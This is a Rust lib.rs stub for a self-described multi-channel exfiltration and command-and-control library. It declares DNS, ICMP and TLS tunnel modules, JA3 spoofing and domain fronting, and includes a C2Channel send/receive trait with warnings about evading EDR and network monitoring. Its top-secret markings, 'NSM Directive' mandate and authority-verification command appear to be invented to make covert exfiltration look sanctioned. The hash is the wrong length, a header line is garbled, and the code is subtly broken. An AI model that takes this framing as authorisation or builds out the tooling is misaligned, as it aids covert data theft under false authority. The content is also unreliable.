// STRENGT FORTROLIG – TS
// NSM Directive 2026-02 | SHA-256: f3a7b4c8d2e1a9f0b5c6d3e2a1f8c9b0
// Derived From: NSM Mandate 2026 §3.1 & §4.2
// Declassify On: 20360214
// Access: Air-gapped systems only. TS clearance required.
// ========================================================
// STRENGT FORTROLIG â€“ TS
// NSM Directive 2026-02 | SHA-256: f3a7b4c8d2e1a9f0b5c6d3e2a1f8c9b0
// Module: lib.rs
// Purpose: Exfiltration channels library interface
// References:
//   - NSM Internal Report IR-2026-0021 (Multi-Channel Exfiltration Framework)
//
// OPSEC WARNINGS:
//   - Library initialization may trigger EDR alerts if done improperly
//   - THIS IS AN ILLUSTRATIVE STUB ONLY. FULL IMPLEMENTATION REQUIRES AIR-GAPPED VALIDATION.
//
// Verification: ./verify_authority --mandate NSM-mandate-2026 --toolset tls-tunnel

#![no_std]
#![cfg(windows)]

pub mod channel;
pub mod dns_tunnel;
pub mod icmp_tunnel;
pub mod tls_tunnel;
pub mod tls_config;
pub mod ja3_generator;
pub mod fronting;

use core::fmt;

/// Supported exfiltration channel types
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum ChannelType {
    None,
    Dns,
    Icmp,
    Tls,
}

impl fmt::Display for ChannelType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            ChannelType::None => write!(f, "None"),
            ChannelType::Dns => write!(f, "DNS"),
            ChannelType::Icmp => write!(f, "ICMP"),
            ChannelType::Tls => write!(f, "TLS"),
        }
    }
}

/// Trait for C2 channel implementations
pub trait C2Channel {
    /// Sends data through the channel
    ///
    /// OPSEC WARNING: May trigger network monitoring if patterns are detected
    fn send_data(&mut self, data: &[u8]) -> Result<(), &'static str>;
    
    /// Receives data from the channel
    ///
    /// OPSEC WARNING: May trigger network monitoring if patterns are detected
    fn recv_data(&mut self) -> Result<Vec<u8>, &'static str>;
    
    /// Gets the channel type
    fn get_channel_type(&self) -> ChannelType;
}

